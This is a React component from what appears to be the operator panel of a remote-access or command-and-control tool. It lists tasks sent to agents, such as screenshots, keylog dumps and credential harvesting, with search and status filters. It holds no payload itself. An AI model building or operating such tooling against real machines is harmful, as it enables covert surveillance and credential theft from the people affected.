/**
 * Tasks List Component
 * 
 * Displays all tasks with filtering, search, and real-time updates.
 * ONLY shows special tasks (screenshot, credentials, keylog) - NOT shell commands.
 */

import React from 'react';
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';
import toast from 'react-hot-toast';
import { Search, Filter, RefreshCw } from 'lucide-react';
import { tasksApi } from '../../lib/api';
import { useTasksStore } from '../../stores/tasksStore';
import { TaskCard } from './TaskCard';
import { TaskDetailModal } from './TaskDetailModal';
import { Button } from '../common/Button';
import { Input } from '../common/Input';
import { Card } from '../common/Card';
import type { Task } from '../../types';

export function TasksList() {
  const queryClient = useQueryClient();
  const { 
    selectedTask, 
    setSelectedTask, 
    statusFilter, 
    setStatusFilter, 
    searchQuery, 
    setSearchQuery,
    agentFilter,
    setAgentFilter
  } = useTasksStore();

  // Fetch tasks
  const { data: tasks = [], isLoading, refetch, isFetching } = useQuery({
    queryKey: ['tasks', agentFilter, statusFilter],
    queryFn: () => tasksApi.list({ 
      agent_id: agentFilter || undefined, 
      status: statusFilter || undefined 
    }),
    refetchInterval: 5000,
  });

  // Filter out shell tasks and apply search
  const filteredTasks = tasks
    .filter(task => task.task_type !== 'shell') // Shell tasks belong in Terminal only
    .filter(task => task.task_type !== 'keylog_start') // Don't show start/stop individually
    .filter(task => task.task_type !== 'keylog_stop')
    .filter((task) => {
      if (!searchQuery) return true;
      
      const query = searchQuery.toLowerCase();
      return (
        task.id.toLowerCase().includes(query) ||
        task.agent_id.toLowerCase().includes(query) ||
        task.command.toLowerCase().includes(query) ||
        task.task_type.toLowerCase().includes(query)
      );
    });

  // Sort tasks (pending first, then by created date)
  const sortedTasks = [...filteredTasks].sort((a, b) => {
    if (a.status === 'pending' && b.status !== 'pending') return -1;
    if (b.status === 'pending' && a.status !== 'pending') return 1;
    return new Date(b.created_at).getTime() - new Date(a.created_at).getTime();
  });

  // Status filter options
  const statusOptions = [
    { value: null, label: 'All Status' },
    { value: 'pending', label: 'Pending' },
    { value: 'sent', label: 'Sent' },
    { value: 'running', label: 'Running' },
    { value: 'completed', label: 'Completed' },
    { value: 'failed', label: 'Failed' },
  ];

  return (
    <div className="space-y-6">
      {/* Filters & Search */}
      <Card>
        <div className="flex flex-col md:flex-row gap-4">
          {/* Search */}
          <div className="flex-1">
            <div className="relative">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-dark-600" />
              <Input
                type="text"
                placeholder="Search tasks by ID, agent, command, or type..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="pl-10"
              />
            </div>
          </div>

          {/* Status Filter */}
          <div className="flex gap-2 flex-wrap">
            {statusOptions.map((option) => (
              <Button
                key={option.value || 'all'}
                variant={statusFilter === option.value ? 'primary' : 'secondary'}
                size="sm"
                onClick={() => setStatusFilter(option.value)}
              >
                <Filter className="w-4 h-4 mr-2" />
                {option.label}
              </Button>
            ))}
          </div>

          {/* Refresh Button */}
          <Button
            variant="secondary"
            size="sm"
            onClick={() => refetch()}
            disabled={isFetching}
          >
            <RefreshCw className={`w-4 h-4 mr-2 ${isFetching ? 'animate-spin' : ''}`} />
            Refresh
          </Button>
        </div>
      </Card>

      {/* Loading State */}
      {isLoading && (
        <div className="text-center py-12">
          <div className="inline-block animate-spin rounded-full h-12 w-12 border-4 border-primary-500 border-t-transparent" />
          <p className="mt-4 text-dark-600">Loading tasks...</p>
        </div>
      )}

      {/* Empty State */}
      {!isLoading && sortedTasks.length === 0 && (
        <Card className="text-center py-12">
          <p className="text-dark-600 mb-2">No special tasks found</p>
          {searchQuery ? (
            <p className="text-sm text-dark-500">
              Try adjusting your search query
            </p>
          ) : (
            <p className="text-sm text-dark-500">
              Use the Agent Detail page to create screenshots, keylog dumps, or harvest credentials
            </p>
          )}
        </Card>
      )}

      {/* Tasks Grid */}
      {!isLoading && sortedTasks.length > 0 && (
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
          {sortedTasks.map((task) => (
            <TaskCard
              key={task.id}
              task={task}
              onClick={setSelectedTask}
            />
          ))}
        </div>
      )}

      {/* Results Count */}
      {!isLoading && sortedTasks.length > 0 && (
        <p className="text-sm text-dark-600 text-center">
          Showing {sortedTasks.length} of {tasks.length} task(s)
        </p>
      )}

      {/* Task Detail Modal */}
      <TaskDetailModal
        task={selectedTask}
        onClose={() => setSelectedTask(null)}
      />
    </div>
  );
}